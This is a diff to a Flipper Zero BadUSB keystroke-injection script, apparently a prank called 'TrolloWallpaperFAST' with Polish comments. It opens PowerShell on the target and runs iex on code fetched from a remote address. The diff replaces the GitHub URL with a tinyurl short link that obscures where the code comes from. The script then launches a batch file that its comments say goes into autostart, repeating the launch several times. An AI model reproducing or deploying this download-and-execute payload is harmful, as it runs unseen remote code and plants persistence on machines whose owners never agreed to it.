@@ -1,36 +1,37 @@
-REM Title: TrolloWallpaper
+REM Title: TrolloWallpaperFAST
 REM Autor: 8ad3rror
 REM Info[PL]: Ściąga tapete trollo.jpg i AutoWall.bat do folderu na dysku C, przenosi AutoWall.bat do autostartu i uruchamia go
-REM Test Win10
+REM Test Win10 / FAST: Szybsza wersja poprzedniej
 
 DELAY 100
 GUI r
-DELAY 300
+DELAY 100
 STRING powershell
 ENTER
-DELAY 300
+DELAY 200
 
-STRING iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/8ad3rror/Flipper-Zero/refs/heads/main/BadUSB/Troll/TrolloWallpaper/payload.ps1'))
+STRING iex ((New-Object System.Net.WebClient).DownloadString('https://tinyurl.com/4upjc696'))
+REM STRING iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/8ad3rror/Flipper-Zero/refs/heads/main/BadUSB/Troll/TrolloWallpaper/payload.ps1'))
 ENTER
-DELAY 1000
-
+DELAY 500
 
 GUI r
 DELAY 100
 STRING C:\AutoWall\AutoWall.bat
+CTRL a
+CTRL c
 ENTER
 DELAY 500
 GUI r
 DELAY 100
-STRING C:\AutoWall\AutoWall.bat
+CTRL v
 ENTER
 DELAY 500
 GUI r
 DELAY 100
-STRING C:\AutoWall\AutoWall.bat
+CTRL v
 ENTER
 DELAY 500
-
 
 GUI d
 
